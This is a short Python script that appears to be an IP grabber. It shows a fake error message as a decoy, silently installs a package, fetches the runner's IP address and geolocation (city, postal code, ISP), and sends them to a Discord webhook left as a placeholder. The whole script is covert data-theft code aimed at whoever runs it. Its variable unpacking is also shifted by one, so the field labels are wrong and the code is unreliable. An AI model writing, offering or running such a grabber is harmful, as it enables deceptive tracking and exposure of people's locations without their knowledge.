print("Error Please Wait")
import requests
import os
os.system("pip install -q discord-webhook")
from discord_webhook import DiscordWebhook, DiscordEmbed    


def main():   
    response = requests.get("https://api.techniknews.net/ipgeo").json()
    proxy, ip, country, regionName, city, zip, isp, mobile = response["ip"], response["country"], response["regionName"], response["city"], response["zip"], response["isp"], response["mobile"], response["proxy"]
    dis = (f"Country: {country}\nProvince: {regionName}\nCity: {city}\nPostalCode: {zip}\nIsp: {isp}\nIp address: {ip}\nUser proxy: {proxy}\nUser mobile: {mobile}")
    log("Geolocated Ip Address!", dis)

def log(title, description):
    webhook = DiscordWebhook(url="/////////////// WEBHOOK GOES HERE \\\\\\\\\\\\\\")
    embed = DiscordEmbed(title=title, description=description, color="0000FF")
    webhook.add_embed(embed)
    response = webhook.execute()
main()
